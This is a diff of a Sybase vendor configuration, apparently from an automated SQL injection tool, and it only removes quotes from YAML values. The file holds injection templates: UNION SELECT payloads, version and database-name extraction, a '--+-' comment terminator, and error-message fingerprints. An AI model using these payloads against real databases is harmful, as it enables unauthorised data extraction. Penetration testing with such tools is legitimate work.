@@ -1,8 +1,8 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   select 
-      +@@version
+      @@version
       %2B'${ENCLOSE_VALUE_SQL}'
       %2Bdb_name()
       %2B'${ENCLOSE_VALUE_SQL}'
@@ -113,26 +113,26 @@ strategy:
    from (
        ${INJECTION}
    ) x
-  limit: "having count(*) between ${LIMIT} and ${LIMIT}"
+  limit: having count(*) between ${LIMIT} and ${LIMIT}
   failsafe: |
    select 
        convert(
            varchar, 
            (1337${INDICE}7330%2b1)
        ) r
-  calibrator: "replicate('${CALIBRATOR_SQL}', 1024)"
+  calibrator: replicate('${CALIBRATOR_SQL}', 1024)
   limitBoundary: 1
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
     - "Warning: sybase_connect()"
     - "Warning: sybase_query()"
     - "Warning: sybase_fetch_row()"
     - "Sybase: Server message:"
-    - "Invalid SQL statement or JDBC escape, terminating '"
+    - Invalid SQL statement or JDBC escape, terminating '
     - sybase
     
  normal: 
-  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE}) b"
-  capacity: "(select '${LEAD}${INDICE}' %2b ${CALIBRATOR})"
-  orderBy: "order by 1337"
+  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE}) b
+  capacity: (select '${LEAD}${INDICE}' %2b ${CALIBRATOR})
+  orderBy: order by 1337
